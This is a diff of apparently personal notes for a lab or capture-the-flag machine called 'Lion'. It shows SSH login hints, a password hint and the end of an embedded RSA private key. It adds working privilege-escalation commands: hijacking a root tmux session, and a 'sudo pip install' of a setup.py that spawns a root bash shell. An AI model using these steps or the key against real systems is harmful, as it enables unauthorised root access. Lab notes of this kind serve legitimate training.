@@ -1,12 +1,13 @@
 # Lion -->
 
 note: ssh is on  1337
-
-note: for login ssh: ssh -i (id_rsa) <ip> <port>
+//chmod 400 id_rsa
+note: for login ssh: ssh -i (file_id-rsa) <user>@<IP>
 
 # Users:
 
 gloria:id_rsa
+//Dance passwd for gloria
 
 alex
 
@@ -44,3 +45,14 @@ ScVJZPT4dqDo3PSIQUw7q0GixCLLdDU9p45CSKPVySYyiGU22RTQS2ccGEcCTurj
 lcY0pO4wZmm5GkseF5moa/1c3aOUZOESAlWGpEg5PNPt3U/SWJTpziGv3NY5DLq9
 R9OsbX0gkO711f8RvRTELQIYFIO/0LcKTjY16g8MtBlMKYCyJ0cWLVWAUoggJxiR
 -----END RSA PRIVATE KEY-----
+
+# ROOT PATHS
+
+//gloria root path:
+export TMUX=/.dev/session,1234,0
+tmux
+
+//alex path:
+TF=$(mktemp -d)
+echo "import pty; pty.spawn('/bin/bash')" > $TF/setup.py
+sudo pip install $TF
